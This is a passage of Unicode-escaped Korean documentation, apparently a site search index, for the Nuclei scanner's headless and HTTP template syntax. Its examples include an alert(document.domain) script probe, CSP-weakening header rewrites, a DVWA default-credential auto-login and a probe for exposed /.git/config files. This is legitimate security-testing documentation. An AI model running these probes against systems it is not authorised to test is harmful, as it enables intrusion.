\ubcc0\uc218\ub97c \uc9c0\uc6d0\ud558\uc5ec \uc694\uccad\uc744 \uc644\uc804\ud788 \uc0ac\uc6a9\uc790 \uc815\uc758\ud569\ub2c8\ub2e4. action : navigate args : url : \"{{BaseURL}}","title":"navigate"},{"location":"kr/templating-guide/protocols/headless/#script","text":"\uc2a4\ud06c\ub9bd\ud2b8\ub294 \ud604\uc7ac \ube0c\ub77c\uc6b0\uc800 \ud398\uc774\uc9c0\uc5d0\uc11c JS \ucf54\ub4dc\ub97c \uc2e4\ud589\ud569\ub2c8\ub2e4. \uac00\uc7a5 \uac04\ub2e8\ud55c \uc218\uc900\uc5d0\uc11c \uc2e4\ud589\ud558\ub824\ub294 JS snippet\uacfc \ud568\uaed8 code \uc778\uc218\ub97c \uc81c\uacf5\ud558\uba74 \ud398\uc774\uc9c0\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4. action : script args : code : alert(document.domain) \uac12\uc744 \uac80\uc0ac\ud558\uae30 \uc704\ud574 JS \uac1d\uccb4\uc5d0\uc11c \ub9e4\ucc98\ub97c \uc2e4\ud589\ud558\uace0 \uc2f6\ub2e4\uace0 \uac00\uc815\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \uc720\ud615\uc758 \ub370\uc774\ud130 \ucd94\ucd9c \uc0ac\uc6a9 \uc0ac\ub840\ub294 nuclei headless\uc5d0\uc11c\ub3c4 \uc9c0\uc6d0\ub429\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 window.random-object \ub77c\ub294 \uac1c\uccb4\ub97c \uac12\uc73c\ub85c \uc124\uc815\ud558\uace0 \ud574\ub2f9 \uac12\uacfc \uc77c\uce58\uc2dc\ud0a4\ub824\uace0 \ud55c\ub2e4\uace0 \uac00\uc815\ud574 \ubcf4\uaca0\uc2b5\ub2c8\ub2e4. - action : script args : code : window.random-object name : script-name ... matchers : - type : word part : script-name words : - \"some-value\" Nuclei\ub294 hook \uc778\uc218\ub85c \ud398\uc774\uc9c0\ub97c \ub85c\ub4dc\ud558\uae30 \uc804\uc5d0 \uc77c\ubd80 \uc0ac\uc6a9\uc790 \uc815\uc758 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \ud398\uc774\uc9c0\uac00 \ub85c\ub4dc\ub418\uae30 \uc804\uc5d0 \ud56d\uc0c1 \uc81c\uacf5\ub41c \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\ub97c \uc2e4\ud589\ud569\ub2c8\ub2e4. \uc608\uc81c\ub294 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0\uc11c \uc0dd\uc131\ub41c \uacbd\uace0\uac00 \ud06c\ub864\ub7ec\ub97c \uc911\uc9c0\ud558\uc9c0 \uc54a\ub3c4\ub85d window.alert \ub97c \ud6c4\ud06c\ud569\ub2c8\ub2e4. - action : script args : code : (function() { window.alert=function(){} })() hook : true \uc774\uac83\uc740 \ud558\ub098\uc758 \uc0ac\uc6a9 \uc0ac\ub840\uc774\uba70 DOM XSS \uac10\uc9c0 \ubc0f Javascript-Injection \uae30\ubc18 \ud14c\uc2a4\ud2b8 \uae30\uc220\uacfc \uac19\uc740 \uae30\ub2a5 \ud6c4\ud0b9\uc758 \uc0ac\uc6a9 \uc0ac\ub840\uac00 \ub354 \ub9ce\uc2b5\ub2c8\ub2e4. \ucd94\uac00 \uc608\uc81c\ub294 \uc608\uc81c \ud398\uc774\uc9c0\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4.","title":"script"},{"location":"kr/templating-guide/protocols/headless/#click","text":"\ud074\ub9ad\uc740 \uc120\ud0dd\uae30\ub85c \uc9c0\uc815\ub41c \uc694\uc18c\ub97c \ub9c8\uc6b0\uc2a4 \uc67c\ucabd \ubc84\ud2bc\uc73c\ub85c \ud074\ub9ad\ud558\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. action : click args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input Nuclei\ub294 XPath, Regex, CSS \ub4f1\uc744 \ud3ec\ud568\ud558\ub418 \uc774\uc5d0 \uad6d\ud55c\ub418\uc9c0 \uc54a\ub294 \ub2e4\uc591\ud55c \uc120\ud0dd\uae30 \uc720\ud615\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc120\ud0dd\uae30\uc5d0 \ub300\ud55c \uc790\uc138\ud55c \ub0b4\uc6a9\uc740 here .","title":"click"},{"location":"kr/templating-guide/protocols/headless/#rightclick","text":"RightClick\uc740 \uc120\ud0dd\uae30\ub85c \uc9c0\uc815\ub41c \uc694\uc18c\ub97c \ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd \ubc84\ud2bc\uc73c\ub85c \ud074\ub9ad\ud558\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. action : rightclick args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input","title":"rightclick"},{"location":"kr/templating-guide/protocols/headless/#text","text":"\ud14d\uc2a4\ud2b8\ub294 \ud0a4\ubcf4\ub4dc\ub85c \uc785\ub825\uc5d0 \ubb34\uc5b8\uac00\ub97c \uc785\ub825\ud558\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. \uc120\ud0dd\uae30\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\ud560 \uc694\uc18c\ub97c \uc9c0\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. action : text args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : username","title":"text"},{"location":"kr/templating-guide/protocols/headless/#screenshot","text":"\uc2a4\ud06c\ub9b0\uc0f7\uc740 \ud398\uc774\uc9c0\uc758 \uc2a4\ud06c\ub9b0\uc0f7\uc744 \ucc0d\uc5b4 \ub514\uc2a4\ud06c\uc5d0 \uc501\ub2c8\ub2e4. \uc804\uccb4 \ud398\uc774\uc9c0\uc640 \uc77c\ubc18 \uc2a4\ud06c\ub9b0\uc0f7\uc744 \ubaa8\ub450 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. action : screenshot args : to : /root/test/screenshot-web \uc804\uccb4 \ud398\uc774\uc9c0 \uc2a4\ud06c\ub9b0\uc0f7\uc774 \ud544\uc694\ud55c \uacbd\uc6b0 \uc778\uc218\uc5d0 fullpage: true \uc635\uc158\uc744 \uc0ac\uc6a9\ud558\uba74 \ub429\ub2c8\ub2e4. action : screenshot args : to : /root/test/screenshot-web fullpage : true","title":"screenshot"},{"location":"kr/templating-guide/protocols/headless/#time","text":"\uc2dc\uac04\uc740 RFC3339 \ud615\uc2dd\uc758 \ud398\uc774\uc9c0\uc5d0\uc11c \uc2dc\uac04 \uc785\ub825\uc5d0 \uac12\uc744 \uc785\ub825\ud569\ub2c8\ub2e4. action : time args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : 2006-01-02T15:04:05Z07:00","title":"time"},{"location":"kr/templating-guide/protocols/headless/#select","text":"select\uc740 selection\uc5d0 \uc758\ud574 HTML \uc785\ub825\uc5d0 \ub300\ud55c selector\uc744 \uc218\ud589\ud569\ub2c8\ub2e4. action : select args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected : true value : option[value=two] selector : regex","title":"select"},{"location":"kr/templating-guide/protocols/headless/#files","text":"Files\ub294 \uc6f9\ud398\uc774\uc9c0\uc5d0\uc11c \ud30c\uc77c \uc5c5\ub85c\ub4dc \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4. action : files args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : /root/test/payload.txt","title":"files"},{"location":"kr/templating-guide/protocols/headless/#waitload","text":"WaitLoads\ub294 \ud398\uc774\uc9c0\uac00 \ub85c\ub4dc\ub97c \uc644\ub8cc\ud558\uace0 \uc720\ud734 \uc0c1\ud0dc\uac00 \ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. action : waitload Nuclei\uc758 waitload \uc791\uc5c5\uc740 DOM\uc774 \ub85c\ub4dc\ub418\uae30\ub97c \uae30\ub2e4\ub9ac\uace0 window.onload \uc774\ubca4\ud2b8\uac00 \uc218\uc2e0\ub418\uae30\ub97c \uae30\ub2e4\ub9b0 \ud6c4 \ud398\uc774\uc9c0\uac00 1\ucd08 \ub3d9\uc548 \uc720\ud734 \uc0c1\ud0dc\uac00 \ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4.","title":"waitload"},{"location":"kr/templating-guide/protocols/headless/#getresource","text":"GetResource\ub294 \uc694\uc18c\uc5d0 \ub300\ud55c src \uc18d\uc131\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. action : getresource name : extracted-value-src args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input","title":"getresource"},{"location":"kr/templating-guide/protocols/headless/#extract","text":"Extract\ub294 HTML \ub178\ub4dc\uc758 \ud14d\uc2a4\ud2b8 \ub610\ub294 \uc0ac\uc6a9\uc790\uac00 \uc9c0\uc815\ud55c \uc18d\uc131\uc744 \ucd94\ucd9c\ud569\ub2c8\ub2e4. \uc544\ub798 \ucf54\ub4dc\ub294 \uc9c0\uc815\ub41c XPath \uc120\ud0dd\uae30 \uc694\uc18c\uc5d0 \ub300\ud55c \ud14d\uc2a4\ud2b8\ub97c \ucd94\ucd9c\ud569\ub2c8\ub2e4. \uadf8\ub7ec\uba74 \ub9e4\ucc98 \ubc0f \ucd94\ucd9c\uae30\uc640 \ud568\uaed8 extracted-value \uc774\ub77c\ub294 \uc774\ub984\uc73c\ub85c \uc77c\uce58\ub420 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. action : extract name : extracted-value args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input \uc694\uc18c\uc5d0 \ub300\ud55c \uc18d\uc131\ub3c4 \ucd94\ucd9c\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4 - action : extract name : extracted-value-href args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target : attribute attribute : href","title":"extract"},{"location":"kr/templating-guide/protocols/headless/#setmethod","text":"SetMethod\ub294 \uc694\uccad\uc5d0 \ub300\ud55c \uba54\uc11c\ub4dc\ub97c \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4. action : setmethod args : part : request method : DELETE","title":"setmethod"},{"location":"kr/templating-guide/protocols/headless/#addheader","text":"AddHeader\ub294 \uc694\uccad/\uc751\ub2f5\uc5d0 \ud5e4\ub354\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \uae30\uc874 \ud5e4\ub354\ub97c \ub36e\uc5b4\uc4f0\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. action : addheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"","title":"addheader"},{"location":"kr/templating-guide/protocols/headless/#setheader","text":"SetHeader\ub294 \uc694\uccad/\uc751\ub2f5\uc5d0 \ud5e4\ub354\ub97c \uc124\uc815\ud569\ub2c8\ub2e4. action : setheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"","title":"setheader"},{"location":"kr/templating-guide/protocols/headless/#deleteheader","text":"\ud5e4\ub354 \uc0ad\uc81c\ub294 \uc694\uccad/\uc751\ub2f5\uc5d0\uc11c \ud5e4\ub354\ub97c \uc0ad\uc81c\ud569\ub2c8\ub2e4. action : deleteheader args : part : response # can be request too key : Content-Security-Policy","title":"deleteheader"},{"location":"kr/templating-guide/protocols/headless/#setbody","text":"SetBody\ub294 \uc694\uccad/\uc751\ub2f5\uc758 \ubcf8\ubb38\uc744 \uc124\uc815\ud569\ub2c8\ub2e4. action : setbody args : part : response # can be request too body : '{\"success\":\"ok\"}'","title":"setbody"},{"location":"kr/templating-guide/protocols/headless/#waitevent","text":"WaitEvent\ub294 \ud398\uc774\uc9c0\uc5d0\uc11c \uc774\ubca4\ud2b8\uac00 \ud2b8\ub9ac\uac70\ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. action : waitevent args : event : 'Page.loadEventFired' \uc9c0\uc6d0\ub418\ub294 \uc774\ubca4\ud2b8 \ubaa9\ub85d\uc740 here \uc5d0 \ub098\uc640 \uc788\uc2b5\ub2c8\ub2e4.","title":"waitevent"},{"location":"kr/templating-guide/protocols/headless/#keyboard","text":"\ud0a4\ubcf4\ub4dc\ub294 \ud0a4\ubcf4\ub4dc\uc758 \ub2e8\uc77c \ud0a4 \ub204\ub974\uae30\ub97c \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. action : keyboard args : keys : '\\r' # \uc774\uac83\uc740 \ud0a4\ubcf4\ub4dc\uc5d0\uc11c Enter \ud0a4\ub97c \ub204\ub974\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. 'keys' \uc778\uc218\ub294 \ud0a4 \ucf54\ub4dc\ub97c \ud5c8\uc6a9\ud569\ub2c8\ub2e4.","title":"keyboard"},{"location":"kr/templating-guide/protocols/headless/#debug","text":"\ub514\ubc84\uadf8\ub294 \uac01 \ud5e4\ub4dc\ub9ac\uc2a4 \uc791\uc5c5 \uc0ac\uc774\uc5d0 5\ucd08\uc758 \uc9c0\uc5f0\uc744 \ucd94\uac00\ud558\uace0 \ube0c\ub77c\uc6b0\uc800\uc5d0\uc11c \ubc1c\uc0dd\ud558\ub294 \ubaa8\ub4e0 \ud5e4\ub4dc\ub9ac\uc2a4 \uc774\ubca4\ud2b8\uc758 \ucd94\uc801\ub3c4 \ud45c\uc2dc\ud569\ub2c8\ub2e4. \ucc38\uace0: \ub514\ubc84\uae45 \ubaa9\uc801\uc73c\ub85c\ub9cc \uc0ac\uc6a9\ud558\uace0 \ud504\ub85c\ub355\uc158 \ud15c\ud50c\ub9bf\uc5d0\uc11c\ub294 \uc0ac\uc6a9\ud558\uc9c0 \ub9c8\uc2ed\uc2dc\uc624. action : debug","title":"debug"},{"location":"kr/templating-guide/protocols/headless/#sleep","text":"\uc808\uc804 \ubaa8\ub4dc\ub294 \ube0c\ub77c\uc6b0\uc800\uac00 \uc9c0\uc815\ub41c \uc2dc\uac04(\ucd08) \ub3d9\uc548 \uae30\ub2e4\ub9ac\uac8c \ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \ub514\ubc84\uae45 \ubaa9\uc801\uc73c\ub85c\ub3c4 \uc720\uc6a9\ud569\ub2c8\ub2e4. action : sleep args : duration : 5","title":"sleep"},{"location":"kr/templating-guide/protocols/headless/#selectors","text":"\uc120\ud0dd\uae30\ub294 nuclei \ud5e4\ub4dc\ub9ac\uc2a4 \uc5d4\uc9c4\uc774 \uc791\uc5c5\uc744 \uc2e4\ud589\ud560 \uc694\uc18c\ub97c \uc2dd\ubcc4\ud558\ub294 \ubc29\ubc95\uc785\ub2c8\ub2e4. Nuclei\ub294 \ub2e4\uc591\ud55c \uc635\uc158\uc744 \ud3ec\ud568\ud558\uc5ec \uc120\ud0dd\uae30 \uac00\uc838\uc624\uae30\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Selector Description r / regex Element matches CSS Selector and Text Matches Regex x / xpath Element matches XPath selector js Return elements from a JS function search Search for a query (can be text, XPATH, CSS) selector (default) Element matches CSS Selector","title":"Selectors"},{"location":"kr/templating-guide/protocols/headless/#matchers-extractor-parts","text":"Matchers/Extractor\uc6a9 Headless \ud504\ub85c\ud1a0\ucf5c\uc774 \uc9c0\uc6d0\ud558\ub294 \uc720\ud6a8\ud55c part \uac12\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. Value Description request Headless Request <out_names> Action names with stored values raw / body / data Final DOM response from browser","title":"Matchers / Extractor Parts"},{"location":"kr/templating-guide/protocols/headless/#example-headless-template","text":"DVWA\uc5d0 \uc790\ub3d9\uc73c\ub85c \ub85c\uadf8\uc778\ud558\ub294 \ud5e4\ub4dc\ub9ac\uc2a4 \ud15c\ud50c\ub9bf\uc758 \uc608\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. id : dvwa-headless-automatic-login info : name : DVWA Headless Automatic Login author : pdteam severity : high headless : - steps : - args : url : \"{{BaseURL}}/login.php\" action : navigate - action : waitload - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input action : click - action : waitload - args : by : xpath value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input[2] action : click - action : waitload - args : by : xpath value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload matchers : - part : resp type : word words : - \"You have logged in as\" \ub354 \uc644\uc804\ud55c \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. here","title":"Example Headless Template"},{"location":"kr/templating-guide/protocols/http/","text":"Requests Nuclei\ub294 HTTP \ud504\ub85c\ud1a0\ucf5c\uacfc \uad00\ub828\ub41c \ub2e4\uc591\ud55c \uae30\ub2a5\uc744 \uad11\ubc94\uc704\ud558\uac8c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. None-RFC \ud074\ub77c\uc774\uc5b8\ud2b8 \uc694\uccad\ub3c4 \uc9c0\uc6d0\ud558\ub294 \uc635\uc158\uacfc \ud568\uaed8 raw \ubc0f \ubaa8\ub378 \uae30\ubc18 HTTP \uc694\uccad\uc774 \uc9c0\uc6d0\ub429\ub2c8\ub2e4. \ud398\uc774\ub85c\ub4dc\ub97c \uc9c0\uc815\ud560 \uc218\ub3c4 \uc788\uace0 \ud398\uc774\ub85c\ub4dc \uac12\uc744 \uae30\ubc18\uc73c\ub85c raw \uc694\uccad\uc744 \ubcc0\ud658\ud560 \uc218 \uc788\uc73c\uba70 \uc774 \ud398\uc774\uc9c0\uc758 \ub4b7\ubd80\ubd84\uc5d0 \ud45c\uc2dc\ub418\ub294 \ub354 \ub9ce\uc740 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. HTTP \uc694\uccad\uc740 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uc791\uc744 \uc9c0\uc815\ud558\ub294 'request' \ube14\ub85d\uc73c\ub85c \uc2dc\uc791\ud569\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. http : Method \uc694\uccad \ubc29\ubc95\uc740 \ud544\uc694\uc5d0 \ub530\ub77c GET , POST , PUT , DELETE \ub4f1\uc774 \ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. # Method\ub294 \uc694\uccad\uc5d0 \ub300\ud55c \uba54\uc18c\ub4dc\uc785\ub2c8\ub2e4. method : GET Redirects \uac01 \ud15c\ud50c\ub9bf\ubcc4\ub85c \ub9ac\ub514\ub809\uc158 \uc870\uac74\uc744 \uc9c0\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \ub9ac\ub514\ub809\uc158\uc740 \ub530\ub974\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. \uadf8\ub7ec\ub098 \uc6d0\ud558\ub294 \uacbd\uc6b0 \uc694\uccad \uc138\ubd80\uc815\ubcf4\uc5d0\uc11c 'redirects: true'\ub85c \ud65c\uc131\ud654\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \ucd5c\ub300 10\uac1c\uc758 \ub9ac\ub514\ub809\uc158\uc774 \ub530\ub974\ubbc0\ub85c \ub300\ubd80\ubd84\uc758 \uc0ac\uc6a9 \uc0ac\ub840\uc5d0 \ucda9\ubd84\ud569\ub2c8\ub2e4. 'max-redirects' \ud544\ub4dc\ub97c \uc0ac\uc6a9\ud558\uc5ec \ub9ac\ub514\ub809\uc158 \uc218\uc5d0 \ub300\ud574 \ub354 \uc138\ubd84\ud654\ub41c \uc81c\uc5b4\ub97c \uc2e4\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc0ac\uc6a9\ubc95\uc758 \uc608: http : - method : GET path : - \"{{BaseURL}}/login.php\" redirects : true max-redirects : 3 Warning \ud604\uc7ac \ub9ac\ub514\ub809\uc158\uc740 \uc694\uccad\ubcc4\ub85c\uac00 \uc544\ub2c8\ub77c \ud15c\ud50c\ub9bf\ubcc4\ub85c \uc815\uc758\ub429\ub2c8\ub2e4. Path \uc694\uccad\uc758 \ub2e4\uc74c \ubd80\ubd84\uc740 \uc694\uccad \uacbd\ub85c\uc758 **path**\uc785\ub2c8\ub2e4. \ub3d9\uc801 \ubcc0\uc218\ub97c \uacbd\ub85c\uc5d0 \ubc30\uce58\ud558\uc5ec \ub7f0\ud0c0\uc784 \uc2dc \ub3d9\uc791\uc744 \uc218\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcc0\uc218\ub294 {{ \ub85c \uc2dc\uc791\ud558\uace0 }} \ub85c \ub05d\ub098\uba70 \ub300\uc18c\ubb38\uc790\ub97c \uad6c\ubd84\ud569\ub2c8\ub2e4. {{BaseURL}} - \uc774\uac83\uc740 \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c Base URL\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. {{RootURL}} - \uc774\uac83\uc740 \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c Root URL\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. {{Hostname}} - \ud638\uc2a4\ud2b8 \uc774\ub984 \ubcc0\uc218\ub294 \ub7f0\ud0c0\uc784\uc5d0 \ub300\uc0c1\uc758 \ud3ec\ud2b8\ub97c \ud3ec\ud568\ud558\ub294 Hostname\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. {{Host}} - \uc774\uac83\uc740 \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c \ub300\ub85c \uc785\ub825 Host\uc5d0 \uc758\ud55c \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uccb4\ub429\ub2c8\ub2e4. {{Port}} - \uc774\uac83\uc740 \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c \uc785\ub825 Port\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. {{Path}} - \uc774\uac83\uc740 \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c \uc785\ub825 Path\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. {{File}} - \uc774\uac83\uc740 \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c \uc785\ub825 \ud30c\uc77c \uc774\ub984\uc73c\ub85c \ub300\uccb4\ud569\ub2c8\ub2e4. {{Scheme}} - \uc774\uac83\uc740 \ub300\uc0c1 \ud30c\uc77c\uc5d0 \uc9c0\uc815\ub41c \ud504\ub85c\ud1a0\ucf5c \uccb4\uacc4\uc5d0 \uc758\ud55c \uc694\uccad\uc758 \ub7f0\ud0c0\uc784 \uc2dc \ub300\uccb4\ub429\ub2c8\ub2e4. \uc544\ub798\uc5d0 \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. - https://example.com:443/foo/bar.php Variable Value {{BaseURL}} https://example.com:443/foo/bar.php {{RootURL}} https://example.com:443 {{Hostname}} example.com:443 {{Host}} example.com {{Port}} 443 {{Path}} /foo {{File}} bar.php {{Scheme}} https \uba87 \uac00\uc9c0 \uc0d8\ud50c \ub3d9\uc801 \ubcc0\uc218 \ub300\uccb4 \uc608: path : \"{{BaseURL}}/.git/config\" # \uc774 \uacbd\ub85c\ub294 \uc2e4\ud589 \uc2dc BaseURL\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. # BaseURL\uc774 https://abc.com \uc73c\ub85c \uc124\uc815\ub41c \uacbd\uc6b0 # \uacbd\ub85c\ub294 https://abc.com/.git/config \ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. \ub300\uc0c1\uc5d0 \ub300\ud574 \uc694\uccad\ub420 \ud558\ub098\uc758 \uc694\uccad\uc5d0 \uc5ec\ub7ec \uacbd\ub85c\ub97c \uc9c0\uc815\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. Headers \u00b6 Headers\ub294 \uc694\uccad\uacfc \ud568\uaed8 \ubcf4\ub0b4\ub3c4\ub85d \uc9c0\uc815\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. \ud5e4\ub354\ub294 \ud0a4/\uac12 \uc30d\uc758 \ud615\ud0dc\ub85c \ubc30\uce58\ub429\ub2c8\ub2e4. \ud5e4\ub354 \uad6c\uc131\uc758 \uc608\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4: # headers contain the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com Body \u00b6 Body\ub294 \uc694\uccad\uacfc \ud568\uaed8 \ubcf4\ub0bc \ubcf8\ubb38\uc744 \uc9c0\uc815\ud569\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4: # Body\ub294 \uc694\uccad\uacfc \ud568\uaed8 \uc804\uc1a1\ub418\ub294 \ubb38\uc790\uc5f4\uc785\ub2c8\ub2e4. body : \"{\\\"some random JSON\\\"}\" # Body\ub294 \uc694\uccad\uacfc \ud568\uaed8 \uc804\uc1a1\ub418\ub294 \ubb38\uc790\uc5f4\uc785\ub2c8\ub2e4. body : \"admin=test\" Session \u00b6 \uc5ec\ub7ec \uc694\uccad \uac04\uc5d0 \uc138\uc158\uacfc \uac19\uc740 \ucfe0\ud0a4 \uae30\ubc18 \ube0c\ub77c\uc6b0\uc800\ub97c \uc720\uc9c0\ud558\ub824\uba74 \ud15c\ud50c\ub9bf\uc5d0\uc11c cookie-reuse: true \ub97c \uc0ac\uc6a9\ud558\uba74 \ub429\ub2c8\ub2e4. \uc775\uc2a4\ud50c\ub85c\uc787 \uccb4\uc778\uc744 \uc644\ub8cc\ud558\uace0 \uc778\uc99d\ub41c \uc2a4\uce94\uc744 \uc218\ud589\ud558\uae30 \uc704\ud574 \uc77c\ub828\uc758 \uc694\uccad \uac04\uc5d0 \uc138\uc158\uc744 \uc720\uc9c0\ud558\ub824\ub294 \uacbd\uc6b0\uc5d0 \uc720\uc6a9\ud569\ub2c8\ub2e4. # cookie-reuse\ub294 \uae30\ubcf8\uc801\uc73c\ub85c \ubd80\uc6b8 \uc785\ub825 \ubc0f false\ub97c \ud5c8\uc6a9\ud569\ub2c8\ub2e4. cookie-reuse : true Request Condition \u00b6 \uc694\uccad \uc870\uac74\uc744 \uc0ac\uc6a9\ud558\uba74 \ubcf5\uc7a1\ud55c \uac80\uc0ac\ub97c \uc791\uc131\ud558\uae30 \uc704\ud55c \uc5ec\ub7ec \uc694\uccad\uacfc \uc775\uc2a4\ud50c\ub85c\uc787 \uccb4\uc778\uc744 \uc644\ub8cc\ud558\uae30 \uc704\ud55c \uc5ec\ub7ec HTTP \uc694\uccad\uc744 \ud3ec\ud568\ud558\ub294 \uc775\uc2a4\ud50c\ub85c\uc787 \uac04\uc758 \uc870\uac74\uc744 \ud655\uc778\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. DSL \ub9e4\ucc98\uc640 \ud568\uaed8 req-condition: true \uc640 \uac01 \uc18d\uc131\uc758 \uc811\ubbf8\uc0ac\ub85c \uc22b\uc790\ub97c \ucd94\uac00\ud558\uc5ec \ud65c\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4(\uc608: status_code_1 , status_code_3 , body_2 ). req-condition : true matchers : - type : dsl dsl : - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\" Example HTTP Template \u00b6 \uc704\uc5d0\uc11c \uc5b8\uae09\ud55c .git/config \ud30c\uc77c\uc758 \ucd5c\uc885 \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. http : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\" RAW HTTP requests \u00b6 \uc694\uccad\uc744 \uc0dd\uc131\ud558\ub294 \ub610 \ub2e4\ub978 \ubc29\ubc95\uc740 